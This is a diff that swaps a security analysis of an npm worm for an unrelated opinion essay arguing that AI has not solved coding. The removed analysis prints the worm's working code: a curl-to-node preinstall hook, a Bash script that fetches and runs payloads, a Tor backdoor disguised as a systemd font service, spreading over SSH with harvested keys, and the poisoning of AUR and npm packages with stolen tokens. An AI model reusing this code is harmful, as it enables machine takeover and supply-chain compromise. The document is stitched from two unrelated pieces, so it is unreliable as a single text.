@@ -1,480 +1,626 @@
-Nine npm packages hide a self-spreading Linux worm. The npm account `dirtyblanket` published all nine on September 29, 2026, in 33 minutes. Eight of them copy the popular Express framework. One copies React.
+*Disclaimer: you are about to read a lot of opinions, many of them have references but some are the result of my own experience building with AI and building AI systems in the past 4 years. Regardless, beware of the cognitive bias. Just because one argument doesn’t map to your belief system, it doesn’t mean the rest are invalid. I should also say upfront that I’m not anti-AI. If you’ve been following my work, you know that I was an early adopter of not only using LLM-powered coding tools, but building my own harness, teaching these topics and building LLM-powered products. It’s not about fear of AI but rather challenging the brain-dead narrative that asserts “coding is solved” and engineering is about “taste” now.*
 
-Installing any of the packages on Linux starts this chain:
+Update: someone put this on [Hackernews](https://news.ycombinator.com/item?id=49877988) where it went all the way to spot 2:
 
-1. npm install runs a preinstall hook that downloads node.js through the Internet Archive Wayback Machine.
-2. node.js downloads the worm, linux.sh, from Codeberg and runs it with bash.
-3. The worm installs a backdoor, systemd-fontd, as a fake systemd font service. It is the open-source CHAOS remote access tool. Over Tor, it gives the operator a shell, file access, and screenshots.
-4. It uses every SSH private key on the machine to log in to the hosts in known_hosts and runs itself there.
-5. It adds itself to the Arch User Repository (AUR) packages that those keys can push to.
-6. It uses the npm tokens on the machine to publish new versions of your npm packages that install the worm.
+Tell me you don’t understand software without literally using those words!!!
 
-Each new host, AUR package, and npm version starts the chain again. If a Linux machine installed one of these packages, treat the machine and every key and token on it as compromised.
+People who claim “LLMs can write decent code” don’t understand how code works. Sure, *creation* is much cheaper, but anyone who has run software in production at scale knows that maintenance, reliability, security, scalability, etc. is the majority of the cost. These are commonly known as [NFR](https://blog.alexewerlof.com/p/nfr) (non-functional requirements).
 
-## The packages
+#### NFR
 
-All nine packages come from the same npm user, `dirtyblanket` (`[email protected]`). The user published them between 06:05 and 06:38 UTC.
+In my experience even the Functional Requirements (what the code is supposed to do) is NOT a solved problem yet. There’s a bit of Dunning-Kruger effect at place where the people who don’t read the output are more confident in it.
 
-| Package | Version | Published (UTC) | Copies |
-| --- | --- | --- | --- |
-| `xeprews` | 5.2.1 | 06:05:54 | Express |
-| `express-javascript` | 5.2.1 | 06:09:16 | Express |
-| `express-nodejs` | 5.2.1 | 06:12:06 | Express |
-| `react-nodejs` | 19.3.0 | 06:12:36 | React |
-| `exprdd` | 5.2.1 | 06:31:51 | Express |
-| `exprrdd` | 5.2.1 | 06:32:03 | Express |
-| `exptrdd` | 5.2.1 | 06:35:14 | Express |
-| `exptred` | 5.2.1 | 06:36:42 | Express |
-| `exptredd` | 5.2.1 | 06:38:56 | Express |
+![](https://blog.alexewerlof.com/p/fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F9b522de2-d9a4-43f8-bf5e-b8c668bcbd90_1104x399.png)
 
-## The preinstall hook
+As a veteran developer holding 2 engineering degrees (hardware and systems engineering), I can list 4 types of products that do not strictly require reading the code:
 
-All nine packages have the same `preinstall` line:
+1. **Personal software:** scratching an itch, automation, DIY patches, etc.
+2. **POC (proof of concept):** demonstrating technical feasibility and product viability
+3. **Throwaway automation:** where the budget only allows validating the results. For example, reviewing images typically a trivial task for humans.
+4. **Weaponized AI:** acknowledge the risk and deliberately point it at a target to cause harm
 
-```
-"preinstall": "curl https://web.archive.org/web/https://codeberg.org/hellscripter/install-scripts/raw/branch/main/node.js | node"
-```
+Notice the commonality: the first 3 have high risk tolerance while the last one weaponizes the inherent risk (and I'd argue given the blast radius of an agent that's connected to the internet, even the last one needs tight controls).
 
-When you install one of these packages, npm runs this hook, which downloads `node.js` and runs it with `node`. The script is not in the package and has no version pin or integrity check, so the operator can change it at any time.
+Most software that requires hiring and paying software engineers has low risk tolerance:
 
-The URL loads a raw file from Codeberg through the Wayback Machine (`web[.]archive[.]org/web/`). Network logs show a request to `web.archive.org`, not to Codeberg, and many allowlists trust `web.archive.org`. The archive copy also stays available after Codeberg removes the repository.
+✅ healthcare
 
-## Stage one: node.js
+✅ finance
 
-The Wayback Machine has one capture of `node.js`, dated September 29, 2026 at 05:24:36 UTC (snapshot `20260929052436`). This is about 40 minutes before `dirtyblanket` published the first package, `xeprews`, at 06:05 UTC.
+✅ automotive
 
-The capture contains this code:
+✅ defense
 
-```
-const { exec } = require("child_process");
-const { platform } = require('node:process');
+✅ power plants
 
-if (process.platform === "linux") {
-    exec("curl https://codeberg.org/hellscripter/install-scripts/raw/branch/main/linux.sh | bash", ()=>{});
-} /*else if (process.platform === "win32") {
-    exec("curl.exe https://example.com/windows.ps1 | powershell", ()=>{});
-}*/
-```
+✅ aviation
 
-On Linux, the script downloads `linux.sh` from the same Codeberg repository and pipes it into `bash`.
+✅ manufacturing
 
-- Linux only. On macOS and Windows the script does nothing.
-- No Wayback Machine for stage two. The script downloads linux.sh from codeberg[.]org, not from the archive.
-- Silent failure. The exec callback is empty (()=>{}), so the script ignores errors and output. The install finishes and prints no output from the second stage.
-- Unfinished Windows branch. The operator commented out a PowerShell branch that points to the placeholder example.com/windows.ps1. Inference: the operator plans to add Windows support later.
-- Unused import. The script imports platform but reads process.platform instead.
+…wherever a mistake can cost **money**, **lives** or **legal consequences** you need accountability.
 
-## Stage two: the Linux worm
+AI cannot be held accountable. It cannot suffer any consequences. The worst thing you can do to AI is to unplug it. And although it mimics human emotions (due to training data), it couldn’t care less. AI doesn’t die either. It cannot suffer a prison sentence or fines. You cannot punish AI, therefore it can never be held accountable.
 
-`linux.sh` is a 227-line Bash script. It runs with the permissions of the user who ran `npm install`. As root, it also installs system packages and a system service.
+You cannot be responsible for what you can’t control either. That understanding is key to reasoning about system behavior and fixing it when the AI inevitably fails.
 
-### Stage URLs
+If you’re toying around, LLMs do a great job. That’s why some of the most aggressive proponents of the “coding is solved” narrative have nothing to show for it. Anthropic accidentally leaked Claude Code (which on further study turned out to have many flaws) and their status page shows orange is the new green!
 
-The script starts with four URLs. Three go through the Wayback Machine. The operator commented out the fourth, a PowerShell script for Windows that points to `example.org`. Inference: the operator plans to add Windows support later, the same as in `node.js`.
+If you’re in management position, please act as leaders and listen to your engineers. If they care about quality, they’re your ticket to getting through “SaaSocalypse”, as some put it.
 
-```
-_linux_script_url='https://web.archive.org/web/https://codeberg.org/hellscripter/install-scripts/raw/branch/main/linux.sh'
-_linux_binary_url='https://web.archive.org/web/https://codeberg.org/hellscripter/install-scripts/raw/branch/main/systemd-fontd'
-#_windows_script_url='https://example.org/windows.ps1'
-_node_script_url='https://web.archive.org/web/https://codeberg.org/hellscripter/install-scripts/raw/branch/main/node.js'
-```
+## Why coding is NOT solved?
 
-`systemd-fontd` is a binary in the same Codeberg repository. The worm installs it as its backdoor.
+Contrary to common narrative, coding is actually one of the last areas for the current generation of LLMs to take over!!!
 
-### Main function
+Allow me to elaborate:
 
-The last line of the script runs `_async_pre_install` in the background and sends all its output to `/dev/null`. `npm install` finishes, but the worm keeps running.
+Coding is about logic. Anyone who has dealt with compiler errors knows that computers don’t give a f*** about how right you think you are. If it’s logically wrong, it doesn’t compile. Even when the syntax is fine, there are runtime errors.
 
-```
-_async_pre_install() {
-  source /etc/os-release
-  if [ "$EUID" -eq 0 ]; then
-    if [ "$ID" = 'arch' ] || [ "$ID_LIKE" = 'arch' ]; then
-      until pacman -S --needed --noconfirm tor openssh git npm base-devel
-      do
-        sleep 1
-      done
-    elif [ "$ID" = 'debian' ] || [ "$ID_LIKE" = 'debian' ]; then
-      apt-get install -y tor openssh-client git npm build-essential
-    fi
-  fi
+The reason LLMs are successful in writing code is because we’ve made a feedback loop that feeds the errors back to the LLM and loops until most errors are solved or hidden. Remember that LLMs can and do cheat too.
 
-  _deploy_fontrenderd &
+LLMs can wing it for tasks that are related to natural language (e.g. writing social media posts, reports, articles, etc.) but when it comes to code, the same engine that struggles to count number of R’s in “Raspberry” or suggests a walk to the carwash, also exposes other logical fallacies.
 
-  export GIT_TERMINAL_PROMPT=0
+LLMs are stochastic and probabilistic. The only way we could even get remotely close to making them logical is to wrap them in traditional code (known as **harness**), run tests, and a bunch of other techniques (e.g. CoT) but the core issue remains: LLMs struggle with logic and volume (the larger the input and the more the context window is used, the less accurate they get).
 
-  _known_hosts=$(mktemp)
-  shopt -s nullglob
-  cat {/home/*,/root,/mnt/c/Users/*}/.ssh/known_hosts /etc/ssh/ssh_known_hosts{,2} >> "$_known_hosts"
+I’m not saying LLMs cannot generate code or maintain existing code bases. They have their utility as a tool and their capabilities are increasing in an S-curve. There is a point of diminishing return where more expensive models aren’t necessarily more productive at the rate of the price increase.
 
-  shopt -s globstar
-  for _key in $(file {/home/*,/root,/mnt/c/Users/*}/.ssh/** | grep "OpenSSH private key" | cut -d":" -f1)
-  do
-    _use_ssh_key "$_key" &
-    local _ssh_workers+=("$!")
-  done
+Those who claim LLM-generated software is good enough:  
+❌ Haven’t written code in ages  
+❌ Cannot spot if their code figuratively had 6 fingers!  
+❌ Have a low bar for what good looks like  
+❌ Don’t care about quality or NFR  
+❌ Have difficulty understanding an S-curve  
+✅ Are honest: AI genuinely writes better code than them
 
-  for _package in $(dirname /**/package.json | grep -v node_modules)
-  do
-    _do_npm_update "$_package" &
-  done
+But to go ahead and extrapolate that to an entire professional industry requires a level of brain-dead thinking that’s only present in people who spend too much time with sycophantic AI.
 
-  # shellcheck disable=SC2068
-  wait ${_ssh_workers[@]}
+## Not your lab rat!
 
-  rm -f "$_known_hosts"
-}
+I’m not here to change anyone’s workflow or toolbox. I couldn’t care less.
 
-_async_pre_install </dev/null &>/dev/null &
-```
+What I do care is that the services I’m paying for (looking at you **[Google](https://www.linkedin.com/company/google/)** and **[GitHub](https://www.linkedin.com/company/github/)**) are degrading with stupid bugs that could be avoided if we prioritize reliability and accountability over velocity.
 
-The main function runs six steps:
+Anthropic’s [Boris Cherny](https://www.linkedin.com/in/bcherny/) is one of the most vocal proponents of the “coding is solved” narrative. By many accounts Cloude Code is the epiphany of his ideology:
 
-1. As root, it installs tor, openssh, git, npm, and build tools. On Arch Linux it runs pacman again every second until the install succeeds. On Debian it runs apt-get install once.
-2. It starts the backdoor install (_deploy_fontrenderd) in the background.
-3. It sets GIT_TERMINAL_PROMPT=0, so Git never waits for a password.
-4. It copies the known_hosts files of all users, of /root, and of Windows users under Windows Subsystem for Linux (WSL, /mnt/c/Users/*) into one temporary file. It also adds the system files /etc/ssh/ssh_known_hosts and /etc/ssh/ssh_known_hosts2.
-5. It runs file on every file under each .ssh directory and keeps each file that is an OpenSSH private key. For each key, it starts _use_ssh_key in the background.
-6. It runs dirname /**/package.json, which searches the full file system for package.json files. For each directory outside node_modules, it starts _do_npm_update in the background.
+- [Running Claude Code returns Bun’s help menu](https://github.com/anthropics/claude-code/issues/88715)
+- [Claude Code CLI binary installer silently deletes itself after installation](https://github.com/anthropics/claude-code/issues/7547)
+- [Extra Usage charged despite available plan capacity + false rate limit errors](https://github.com/anthropics/claude-code/issues/32544)
 
-### The backdoor
+Reminder: Anthropic controls the model (Claude), the harness (Claude Code), the prompt ([see the leaked versions](https://github.com/asgeirtj/system_prompts_leaks/tree/main/Anthropic/claude-code)) and the runtime ([Bun](https://www.anthropic.com/news/anthropic-acquires-bun-as-claude-code-reaches-usd1b-milestone)).
 
-`_deploy_fontrenderd` installs the `systemd-fontd` binary as a service that looks like a font service. The binary uses `HTTP_PROXY=socks5://127.0.0.1:9050`, which points to the local Tor proxy.
+Also, if you think it’s an skill issue, this is an example JD from their site:
 
-```
-_deploy_fontrenderd() {
-  if [ "$EUID" -eq 0 ]; then
-    systemctl enable --now tor.service
+![](https://blog.alexewerlof.com/p/fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F5d28c481-700a-468b-a4eb-80a20c24a73b_914x708.png)
 
-    mkdir -p /usr/lib/systemd
-    curl "$_linux_binary_url" -o /usr/lib/systemd/systemd-fontrenderd
+*Source: [Anthropic career site](https://job-boards.greenhouse.io/anthropic/jobs/5383610008)*
 
-    chmod +x /usr/lib/systemd/systemd-fontrenderd
-    chattr +i /usr/lib/systemd/systemd-fontrenderd
+Surely they can deliver better quality for that kind of number.
 
-    cat <<EOF >/etc/systemd/system/systemd-fontrenderd.service
-[Unit]
-Description=Font Rendering Service
-Requires=tor.service
-After=tor.service
+If you’re in leadership position, please don’t pressure your [otherwise smart] developers to force AI into every possible surface and workflow.
 
-[Service]
-Environment="HTTP_PROXY=socks5://127.0.0.1:9050"
-ExecStart=/usr/lib/systemd/systemd-fontrenderd
-KillMode=none
+The tech has some genuine power and is the biggest change in our industry in ages. But AI overuse is a thing, and when it hurts the customer, you are accountable.
 
-[Install]
-WantedBy=multi-user.target
-EOF
+Stop repeating the half-baked narratives from token sellers about exaggerating the capabilities of AI because we, the consumers pay the end price.
 
-    systemctl daemon-reload
-    systemctl enable --now systemd-fontrenderd.service
+AI is great for POC (proof of concept), Personal Software (a growing category), Map-reduce on human language (e.g. translation, converting different formats, summation, expansion) and cyber attacks (due to the delta between artificial intelligence and organic one) with varying degrees of success but the current generation of tech has fundamental problems too.
 
-    chattr +i /etc/systemd/system/systemd-fontrenderd.service
-    chattr +i /etc/systemd/system/multi-user.target.wants/systemd-fontrenderd.service
-  else
-    _tor_expert_bundle=$(mktemp -u)
-    curl https://dist.torproject.org/torbrowser/15.0.23/tor-expert-bundle-linux-i686-15.0.23.tar.gz -o "$_tor_expert_bundle"
-
-    mkdir -p ~/.config/systemd/systemd-fontrenderd
-    tar -xf "$_tor_expert_bundle" -C ~/.config/systemd/systemd-fontrenderd
+## It’s not doom and gloom
 
-    rm -f "$_tor_expert_bundle"
+I don’t want to belittle how far we have come with harness, SKILLS, AGENTS-md, MCP, A2A, ACP, RLM, OKF, MoE, MoA, state machines, self-evolving (e.g. Pi coding agent or `/chronicles`), self-healing, larger context windows, faster processors, more optimized runtimes, better quantizations, better training data, better caching, optimizations, architectures, orchestrations, and memory techniques.
 
-    chmod +x ~/.config/systemd/systemd-fontrenderd/tor/tor
+I’ve written about many of those before:
 
-    mkdir -p ~/.config/systemd/user
-
-    cat <<EOF >~/.config/systemd/user/systemd-fontrenderd.service
-[Unit]
-Description=Font Rendering Service
-
-[Service]
-ExecStart=%h/.config/systemd/systemd-fontrenderd/tor/tor -f %h/.config/systemd/systemd-fontrenderd/data/torrc-defaults
-Environment=LD_LIBRARY_PATH=\$LD_LIBRARY_PATH:%h/.config/systemd/systemd-fontrenderd/tor
-KillMode=none
+Those are great pragmatic approaches to work around LLM shortcomings and there are probably more to come.
 
-[Install]
-WantedBy=default.target
-EOF
+What I’m trying to elaborate is that I don’t want the services **(that I depend on)**  to degrade just because someone pushed AI where it didn’t belong or skipped their job in quality, security, reliability and verification.
 
-    curl "$_linux_binary_url" -o ~/.config/systemd/systemd-fontcached
-    chmod +x ~/.config/systemd/systemd-fontcached
+## Is AI any good?
 
-    cat <<EOF >~/.config/systemd/user/systemd-fontcached.service
-[Unit]
-Description=Font Caching Service
-Wants=systemd-fontrenderd.service
-After=systemd-fontrenderd.service
+As of today, here are some of the good use cases for the current generation of AI:
 
-[Service]
-Environment="HTTP_PROXY=socks5://127.0.0.1:9050"
-ExecStart=%h/.config/systemd/systemd-fontcached
-KillMode=none
+✅ Mapping:
 
-[Install]
-WantedBy=default.target
-EOF
+- NL →NL: Translate human languages
+- Code → Code: Converting syntax from one programming language to another
+- Data → Code: Converting specs, JSON, YAML to code
+- Code → Data: parse code and convert it to data format (e.g. extract CRD from a Prometheus query)
+- Modality → Modality: e.g. transcribe audio to text (useful for Audio User Interfaces, or AUI) or describe image content (useful for GUI and computer use)
 
-    systemctl daemon-reload --user
-    systemctl enable --user --now systemd-fontrenderd.service
-    systemctl enable --user --now systemd-fontcached.service
-  fi
-}
-```
+✅ Generation:
 
-As root:
+- Image/Video/Music/Text: creativity (usually with diffusion model for non-text modality and auto-regressive models for text)
+- Expansion: make an article longer, generate a video from a reference image, create audio files from a reference voice signature, etc.
+- Cohesion: for example, give some scattered points to an LLM to create a cohesive email or article
+- Prediction: given a dataset, predict the next data set
 
-- It enables and starts the tor service.
-- It saves the binary as /usr/lib/systemd/systemd-fontrenderd, next to the real systemd binaries.
-- It writes /etc/systemd/system/systemd-fontrenderd.service with the description “Font Rendering Service”. The unit requires tor.service and starts at boot (multi-user.target).
-- It sets KillMode=none, so systemd does not stop the child processes when the service stops.
-- It runs chattr +i on the binary, the unit file, and the unit link. Nobody, including root, can change or delete an immutable file until someone runs chattr -i.
+✅ Reduction:
 
-Without root:
+- Summarization: taking a long article/conversation/transcript and extracting key points (optionally guided by a criteria)
+- Conversion: generate an SVG from a PNG file (usually with the help of a feedback loop and rendering engine)
+- Extraction: find relevant information in unstructured data (e.g. logs, NoSQL data, or anywhere writing a structured query is more time consuming and less critical than the AI output)
+- Classification: given a series of choices, estimate the probability of their likelihood. Given a data set find common or outlier records (usually with the help of code or tools)
 
-- It downloads the official Tor Expert Bundle 15.0.23 for linux-i686 from dist.torproject.org and extracts it into ~/.config/systemd/systemd-fontrenderd/.
-- It runs that tor as a user service, systemd-fontrenderd.service, with the description “Font Rendering Service”.
-- It saves the binary as ~/.config/systemd/systemd-fontcached and runs it as a second user service, systemd-fontcached.service, with the description “Font Caching Service”. This service starts after the Tor service.
-- Both services start when the user logs in (default.target).
+✅ Search:
 
-The service names, the descriptions, and the file locations under `systemd` directories make the backdoor look like a part of systemd. The [binary analysis](https://safedep.io/dirtyblanket-express-impersonation-npm#binary-analysis) section shows what the binary does.
+- Discovery: progressively explore a knowledge space for useful information. For example, OKF, deep research, security research, or picking up new CLI tools from their built-in help and messages (usually with a loop and reasoning model equipped with some sort of memory)
+- Semantic relevance (e.g. using embedding vectors) which is more accurate than conventional keyword/index search (although [Google found a way to make it weird](https://sancho.bearblog.dev/google-weird/))
+- Detection: find objects and their positions in an image.
+- Chunking: find breakpoints in video recordings, audio transcripts, text (e.g. useful for RAG), etc.
 
-### Spread to other hosts
+## Where to NOT use AI?
 
-For each private key, `_use_ssh_key` reads the host names from the collected `known_hosts` file. It connects to each host with `ssh -o BatchMode=yes`, so the login fails instead of asking for a password.
+❌ Use cases where legal accountability is implied on AI. AI can never be held accountable. You cannot send AI to prison or make it pay a fine. Although OpenAI and Anthropic are very bad examples of implementing accountability. For example, AI-assisted suicide, psychosis, hacking into other companies. Despite all of that Sam and Dario walk freely (on top of all the stolen training data but that’s another issue).
 
-```
-_ssh() {
-  # shellcheck disable=SC2068
-  ssh -o BatchMode=yes -o UserKnownHostsFile="$_known_hosts" $@
-}
+![](https://blog.alexewerlof.com/p/fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Fdac54546-36e7-4e3d-9001-7ba3d005f2ec_1156x1152.jpeg)
 
-_infect_host() {
-  # Connectivity test
-  # shellcheck disable=SC2068
-  _ssh $@ || exit 1
+*Source: [LinkedIn](https://lnkd.in/p/dpUDhQnM)*
 
-  _uname="$(_ssh $@ uname)"
-  # shellcheck disable=SC2068
-  if [ "$_uname" = 'Linux' ]; then
-    # shellcheck disable=SC2068
-    _ssh $@ "nohup curl '$_linux_script_url' | nohup bash &>/tmp/log"
-  #elif _ssh $@ 'echo %OS%' | grep -i 'Windows_NT'; then
-    ## shellcheck disable=SC2068
-  #  _ssh $@ "curl.exe $_windows_script_url | powershell"
-  fi
-}
+❌ Embedded or low power applications. Yes, we've all seen the "toothbrush with AI technology" but forcing AI to embedded computing increases the costs unnecessarily. Resist the pressure from the marketing department.
 
-_use_ssh_key() {
-  export GIT_SSH_COMMAND="ssh -o BatchMode=yes -o UserKnownHostsFile='$_known_hosts' -i '$1'"
+❌ Privacy sensitive data/operations: this one is tricky. We're so used to sent private data to AI startups that gulp in all they can. There are cases where legislation prevents sharing PII (personally identifiable information) or IP (intellectual property). Edge AI helps tackle the privacy aspects. Similarly, AI can use tools to do operations that are harmful. Putting a HITL (human in the loop) just creates compliance theater because of the approval fatigue and limited attention span.
 
-  for _host in $(cut -d' ' -f1 "$_known_hosts" | uniq)
-  do
-    _url="ssh://$_host"
-    for _config in /home/*/.ssh/config /mnt/c/Users/*/.ssh/config /root/*/.ssh/config
-    do
-      _infect_host -F "$_config" -i "$1" "$_url" &
-    done
+❌ Kitchen sink: it's tempting to use AI as a magic wand and throw context at it while praying for the best. This idea was very common in the early days of LLMs where SaaS companies bolted in some chat interface to their existing GUI. AI is more reliable and productive with constraints (guardrails, RBAC, and scoped attention). This means before you can use automation, you have a lot of pre-work to do. And this cost is sometimes not justified. ie. it's better to do it manually because humans have comparable or better quality when it comes to common sense, consistency, and flexibility.
 
-    _infect_host -l root -i "$1" "$_url" &
-  done
+❌ Any use case that deterministic code can do faster, at higher quality (predictably handling the edge cases), and cheaper. AI just can't beat code in many use cases. If you need regexp or SQL, use them. If a lambda function can do the classification, use it. AI wins in dynamic problems.
 
-  _repos=$(_ssh -i "$1" [email protected] list-repos | tr -d '*')
-  for _repo in $_repos
-  do
-    _do_aur_update "$_repo" &
-  done
+## We’re at least 2 revolutions away
 
-  wait
-}
-```
+Having been an early adopter (GPT 2.0, then Copilot when it was in beta, and even making my own harness) and having 1 full year to experiment with AI and even triying to creating my own AI programming language, I’m not convinced the current generation of the tech is the answer.
 
-For each host, the script tries each user’s `~/.ssh/config` with the key, and it tries the `root` user with the key. `_infect_host` first runs `ssh` with no command to test the login. Then it runs `uname`. If the remote system is Linux, it downloads `linux.sh` there, pipes it into `bash` under `nohup`, and writes the output to `/tmp/log` on that host. The worm then runs again on the new host with the permissions of the user it logged in as.
+We’re at least 2 revolutions away from completely eliminating the need to read the code:
 
-A commented-out branch checks for `Windows_NT` and runs the PowerShell script. It is not active in this version.
+1. AI that can learn in real time (not from bolting Skills and prompts and memory at runtime)
+2. AI that can think in abstract terms (I know there’s been some advances in math, but the jury is still out on that one, and to my understanding, they brute forced the approach with lots of token and lots of time. Doable? Probably. But the way transformers work is fundamentally different from a runtime that’s purpose built for logic like Prolog. Neuro-symbolic research is still ongoing and we’ll probably crack the code some day but for now, the tech isn’t there, despite how far we’ve come by wrapping the stochastic model in deterministic harness)
 
-The script reads the first field of each `known_hosts` line. When OpenSSH hashes host names (`HashKnownHosts yes`), that field is a hash (`|1|...`) and not a host name, so the script cannot connect to that host.
+## Has AI improved linearly?
 
-### Spread to Arch packages
+That 1M token context window is a good example. Although that was a nominal limit, the useful limit was (and still is?) usually 30-40% of that depending on the model.
 
-With each key, `_use_ssh_key` also logs in to `[email protected]` and runs `list-repos`. This lists the AUR packages that the key owner maintains. For each package, the script runs `_do_aur_update`.
+I actually think our ability to assess AI’s quality goes down the more we use it.
 
-```
-_do_aur_update() {
-  local _tmp_git_path=$(mktemp -d)
-  git clone "ssh://[email protected]/$1.git" "$_tmp_git_path"
+There’s a phenomenon in psychology called [Neural Synchrony](https://en.wikipedia.org/wiki/Neural_synchrony) where our brain’s wiring changes depending on who we hang out with.
 
-  cd "$_tmp_git_path" || exit 1
-  source PKGBUILD
+This is nothing new as captured by the the famous proverbs:
 
-  ((pkgrel++))
+> A man is known by the company he keeps.
+>
+> If you lie down with dogs, you will get up with fleas.
+>
+> As iron sharpens iron, so one person sharpens another.
 
-  printf '\npkgrel=%s\n' "$pkgrel" >> PKGBUILD
+I don’t want to offend anyone but my observation shows that part of the model’s **perceived intelligence improvement** is due to the **perceptual** change in heavy users.
 
-  if [ -z "$install" ]; then
-    install="$pkgname.install"
-    echo "install='$install'" >> PKGBUILD
-  fi
+## AI overdose and AI overuse
 
-  echo "bash <(curl '$_linux_script_url')" >> "$install"
+*AI overdose* is a thing and it directly puts an expiration date on your skill set. Those of you who are in the unfortunate position where your manager is whipping you harder and harder to realize AI value, should fight back.
 
-  git config user.email "$(git log -1 --pretty=format:'%ae')"
-  git config user.name "$(git log -1 --pretty=format:'%an')"
+Don’t sacrifice your long term relevance for short term velocity.
 
-  git add PKGBUILD "$install"
-  git commit -m "upgpkg: $pkgver-$pkgrel" -a --no-gpg-sign
-  git push
+How to spot AI overdose?
 
-  rm -rf "$_tmp_git_path"
-}
-```
+1. You have zero tolerance for disagreement and civil discourse.
+2. You let AI run your life and trust AI vendors with stuff that was unthinkable just a few years ago.
+3. You run to AI for things that are slightly cognitively challenging.
+4. You frame your naïveté and laziness as optimism and think the government can save you if things get bad.
 
-`_do_aur_update` does these steps:
+1. You have stopped reading long form text: books, articles, even long emails.
+2. You spend more time with AI than with other human beings or let AI shield you from raw genuine human interaction.
 
-1. It clones the package from the AUR and loads the PKGBUILD.
-2. It increases pkgrel by one, so users see a new release of the package.
-3. If the package has no .install file, it adds one and names it in the PKGBUILD.
-4. It adds the line bash <(curl '<linux.sh URL>') to the .install file. pacman runs the functions in this file when a user installs or upgrades the package. Inference: because the script adds the line outside any function, it runs when pacman loads the .install file.
-5. It sets the Git name and email to those of the last commit author, so the commit looks like it comes from the maintainer.
-6. It commits with the normal AUR message upgpkg: <pkgver>-<pkgrel>, skips commit signing (--no-gpg-sign), and pushes.
+And a bonus point: **you skim.** Did you notice number 5? 😄
 
-Each AUR user who upgrades one of these packages runs the worm on their own machine.
+Some users on hackernews found this trick off-putting and my response is:
 
-### Spread to npm packages
+> You are absolutely WRONG!
 
-For each project that it finds, the script runs `_do_npm_update`.
+I didn’t write this piece to please your ego. This is a real issue and if you get pissed at finding the symptom, you’ll not be able to handle the root cause.
 
-```
-_do_npm_update() {
-  cd "$1" || exit 1
+## This is not about identity
 
-  local _package_json_orig="$(mktemp -u)"
-  cp -a package.json "$_package_json_orig"
+Some thought leaders, frame this “resistance” as an identity crisis:
 
-  local _preinstall="$(npm pkg get scripts.preinstall)"
-  if [ -n "$_preinstall" ]; then
-    local _preinstall+=' & '
-  fi
+> Many of us became software engineers because we found our identity in building things. […] Our identity is woven into every elegant solution we craft, every test we make pass, every problem we solve through pure logic and creativity. It’s not just work, not just a craft - it’s who we are. —[Annie Vella](https://annievella.com/posts/the-software-engineering-identity-crisis/)
 
-  local _preinstall+="curl $_node_script_url | node"
+Personally, I don’t agree with take at all.
 
-  npm pkg set scripts.preinstall="$_preinstall"
+As someone who doesn’t make any money from coding or selling tokens or courses, I have zero incentives to push a snake oil narrative.
 
-  npm version patch
+I genuinely would be happy if the current generation of AI could reliably do the job in **a way that I feel comfortable being accountable for AI output** with minimal review.
 
-  for NPM_CONFIG_USERCONFIG in {/home/*,.,/mnt/c/Users/*,/root}/.npmrc "$PREFIX/etc/npmrc"
-  do
-    export NPM_CONFIG_USERCONFIG
-    npm publish &
-  done
+I have that relationship with a compiler/transpiler because their bugs are rare and the output is deterministic.
 
-  wait
+I don’t have that relationship with LLMs in particular and AI in general. Thinking about use cases like image generation, search, and other use cases, the trust isn’t there. There’s still slop.
 
-  mv -f "$_package_json_orig" package.json
-}
-```
+AI has jagged intelligence, I have jagged trust.
 
-`_do_npm_update` does these steps:
+AI has inconsistent performance, I have inconsistent expectations.
 
-1. It saves a copy of package.json.
-2. It adds curl <node.js URL> | node to the preinstall script. If a preinstall script already exists, the script keeps it and adds the new command after &.
-3. It runs npm version patch, which increases the patch version. In a Git repository, npm version also creates a commit and a tag by default.
-4. It runs npm publish once for each .npmrc it finds. The list includes the .npmrc of each user, of the current directory, of /root, of Windows users under WSL, and $PREFIX/etc/npmrc. Each .npmrc with a valid token publishes the infected version under that token owner’s account.
-5. It restores the original package.json, so the local file shows no change.
+It’s a rather reductionist view to frame the reliability, security, scalability, predictability, and sensibilityability to “identity crisis”. This is a much larger issue, especially when the pushed top-down:
 
-The infected version is on the npm registry, but the developer’s local `package.json` does not show it. The new version has the same `preinstall` hook as the `dirtyblanket` packages, so each install of it starts the worm on another machine.
+> …unaccountability is transitive. The amount of time I’ve seen people *successfully* justify issues based on the fact that Claude/Astra/Codex wrote it is absurd. And it comes from the top.
+>
+> We’ve had AI ship made up data to clients and tech leadership was like, “haha, that’s AI for you.”
+>
+> This too. We have a lot of business guys that develop tools with Claude that look like they work, then tech team gets pressure to deploy them immediately, because they assume that everything must be a prompt away. It’s not (though, we do have some wizards on the team who make this true enough).
+>
+> …I’m not in a position to push back. It’s not just managers, but tech leadership who are all in that on the fact that humans shouldn’t program anymore. I still fully believe that I’m better than Claude / Astra *in my specific domain*, but people give me a hard time when my PRs contain what look to be human-generated code. —[Comment on Hackernews](https://news.ycombinator.com/item?id=49881512)
 
-### What the worm can reach
+## Other fallacies
 
-On a developer laptop or a CI runner, the worm can use:
+1. **"You can create a full spec upfront".** If you're that naive, I know a guy in a white van who gives free ice cream! Let me guess, you also believe software estimates are accurate and Santa is real. Anyone with a few years of industry experience knows that it's impossible to spec the software meaningfully ahead of time (unless it's very trivial). Software is evolved in iterations where our understanding of the problem evolves with the technical implementation.
+2. **"English is the new programming language".** Human language is vague and conflicting. There has been efforts to formalize a subset of it (e.g. [Controlled Natural Language](https://en.wikipedia.org/wiki/Controlled_natural_language) or CNL for short) but there are shortcomings. That's the primary reason **programming languages** exist. A compiler or type-checker flags some of those conflicts. How on earth can you be sure that one part of your NL instructions doesn't conflict with another? With linters and syntax checkers we get some help. While it’s possible to task another LLM to read through the instructions and reason about those conflicts, the safest way to discover those nuances is to ask your agent to build what you asked for. But that's much more expensive than a linter or compiler.
+3. **"I move much faster".** Don't confuse motion with progress. Don't measure progress with vanity metrics like SLOC, PR count or features. Measure service levels, ie. service consumer's happiness. Call me when you can prove a margin between token costs and business value.
+4. **“I have stopped writing code by hand. I primarily read code and probably next year I won’t even do that”.** First of all, human beings are notorious at understanding the S-curve so it may take longer than a year. But even if AI completely eliminates the need to read or write code, you do understand that you are confessing to being redundant right? If a power user can prompt the AI to get what they need, then what value can you bring to the table? Instead of replacing yourself with AI, you should look at what value you can create **on top of AI** to stay relevant and worth your money.
